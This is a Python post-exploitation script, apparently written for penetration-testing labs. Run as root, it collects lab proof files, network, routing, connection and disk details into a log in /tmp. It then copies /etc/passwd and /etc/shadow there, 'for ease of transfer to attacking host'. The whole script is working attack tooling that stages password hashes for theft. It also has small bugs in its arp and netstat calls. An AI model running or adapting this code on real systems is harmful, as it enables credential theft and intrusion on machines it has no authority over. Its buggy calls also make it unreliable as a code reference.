#!/usr/bin/env python3
"""
Title: postRoot.py
Author: pwnd_root
Description: Collects target's data, post-root and writes them to /tmp/postSysData.txt. Also makes a copy of passwd
             and shadow files for ease of transfer to attacking host. More enumeration and transfer functionalities
             were planned to be implemented in the future.
"""
# import calls
import os
import subprocess
import sys

if not os.geteuid() == 0:
    sys.exit ("[!]\tThis script must be run as root")

log = open ("/tmp/postSysData.txt", "w")
proofPath = ''
ntwPath = ''


def findFile (fileName, rootPath):

   file = ''
   for root, dir, files in os.walk(rootPath):
      if fileName in files:
         file =os.path.join(root, fileName)
   return file


def writeToLog (process, whatis):

    print ("[+] " + whatis)
    log.write ("\n[-----" + whatis + "-----]\n")
    while True:
        line = process.stdout.readline ()
        if not line:
            break
        log.writelines (str(line))


# Getting proof.txt and network-secret.txt
proofPath = findFile ("proof.txt", "/")
ntwPath = findFile ("network-secret.txt", "/")
if proofPath:
    print ("[+] proof.txt")
    temp = open (proofPath, "r")
    log.write ("\n[-----proof.txt-----]\n")
    log.write (temp.read())
    temp.close ()
else:
    print ("\t[!] proof.txt not found. Enum manually")

if ntwPath:
    print ("[+] network-secret.txt")
    temp = open (ntwPath, "r")
    log.write ("\n[-----network-secret.txt-----]\n")
    log.write (temp.read())
    temp.close ()
else:
    print ("\t[!] network-secret.txt not found. Enum manually")

# IP Info
try:
    ipInfo = subprocess.Popen(['ifconfig', '-a'], stdout=subprocess.PIPE, universal_newlines=True)
    writeToLog (ipInfo, "IP")
except:
    try:
        ipInfo = subprocess.Popen(['ip', 'a'], stdout=subprocess.PIPE, universal_newlines=True)
        writeToLog (ipInfo, "IP")
    except:
        print ("\t[!] IP data not written. Enum manually")

# ARP Info
try:
    arpIno = subprocess.Popen(['arp', 'a'], stdout=subprocess.PIPE, universal_newlines=True)
    writeToLog (ipInfo, "ARP")
except:
    try:
        temp = open ("/proc/net/arp", "r")
        log.write ("\n[-----ARP-----]\n")
        log.write (temp.read())
        print ("[+] ARP")
        temp.close()
    except:
        print ("\t[!] ARP enum failed. Enum manually")

# Route info
try:
    routeInfo = subprocess.Popen(['/sbin/route'], stdout=subprocess.PIPE, universal_newlines=True)
    writeToLog (routeInfo, "route")
except:
    try:
        routeInfo = subprocess.Popen(['/sbin/routel'], stdout=subprocess.PIPE, universal_newlines=True)
        writeToLog(routeInfo, "route")
    except:
        print ("\t[!] Route Enum failed. Enum manually")

# hostname
try:
    hostInfo = subprocess.Popen(['cat', '/etc/hosts'], stdout=subprocess.PIPE, universal_newlines=True)
    writeToLog(hostInfo, "hosts")
except:
    print ("\t[!] hosts enum failed. Check manually")

# Disks Present /bin/lsblk
try:
    routeInfo = subprocess.Popen(['/bin/lsblk'], stdout=subprocess.PIPE, universal_newlines=True)
    writeToLog (routeInfo, "Disks")
except:
    print ("\t[!] Disks enum failed. Enum manually")

# Active Connections
try:
    routeInfo = subprocess.Popen(['netstat' '-anp'], stdout=subprocess.PIPE, universal_newlines=True)
    writeToLog(routeInfo, "Active Connections")
except:
    try:
        routeInfo = subprocess.Popen(['ss', '-anp'], stdout=subprocess.PIPE, universal_newlines=True)
        writeToLog(routeInfo, "Active Connections")
    except:
        print("\t[!] Active Connections Enum failed. Enum manually")

# Mounted drivers
try:
    mountVol = subprocess.Popen(['cat', '/etc/fstab'], stdout=subprocess.PIPE, universal_newlines=True)
    writeToLog (mountVol, "Mounted Drivers")
except:
    print ("\t[!] Mounted drivers enum failed. Enum manually")

# copy passwd and shadow. For ease of transfer
subprocess.Popen (['cp', '/etc/passwd', '/tmp/passwd'], stdout=subprocess.PIPE)
subprocess.Popen (['cp', '/etc/shadow', '/tmp/shadow'], stdout=subprocess.PIPE)

print ("[+] Process Over. Ready for transfer")